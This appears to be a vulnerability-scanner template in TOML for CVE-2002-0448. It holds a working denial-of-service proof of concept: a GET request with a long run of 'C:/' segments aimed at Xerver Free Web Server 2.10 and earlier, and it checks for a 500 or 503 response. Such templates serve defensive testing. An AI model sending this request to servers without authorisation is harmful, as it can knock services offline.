[info]
author = "ave"
description = "向 Xerver Free Web Server 2.10 及更早版本发送包含大量 C:/ 序列的 HTTP 请求以验证拒绝服务漏洞"
id = "POC-AVE-2002-0303"
name = "Xerver Free Web Server Multiple Request DoS PoC"
severity = "medium"
tags = ["ave-2002-0303"]
vuln_id = [
    "CVE-2002-0448",
    "AVE-2002-0303",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/C:/C:/C:/C:/C:/C:/C:/C:/C:/C:/C:/C:/C:/C:/C:/C:/C:/C:/C:/C:/C:/C:/C:/C:/C:/C:/C:/C:/C:/C:/C:/C:/"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [
    500,
    503,
]
type = "status"
